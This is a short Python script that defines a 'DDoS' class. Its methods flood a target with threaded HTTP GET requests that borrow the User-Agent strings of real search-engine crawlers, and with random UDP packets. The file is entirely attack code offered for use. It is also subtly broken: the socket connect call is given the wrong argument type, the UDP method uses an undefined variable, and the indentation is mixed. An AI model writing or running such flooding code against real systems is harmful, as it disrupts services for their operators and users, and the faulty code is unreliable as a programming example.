import requests, threading, socket, random
class DDoS:
	def __init__(self, ip):
		self.udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		if "https://" not in ip:
			self.site = "https://" + ip
			self.udp.connect(ip)
		else:
			self.site = ip
	def attack_get(self):
		def thread():
			requests.get(self.site, headers={"User-Agent": user})
		botnet = ['Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)', 'Mozilla/5.0 (compatible; GrapeshotCrawler/2.0; +http://www.grapeshot.co.uk/crawler.php)']
		user = botnet[random.randint(0,2)]
		for x in range(5):
			multi_pro = threading.Thread(target=thread)
			multi_pro.start()
	def attack_udp(self):
		
		
		bytes = random._urandom(9999)
		udp.send(bytes)
	def credits(self):
        	print("all credits to portinous")
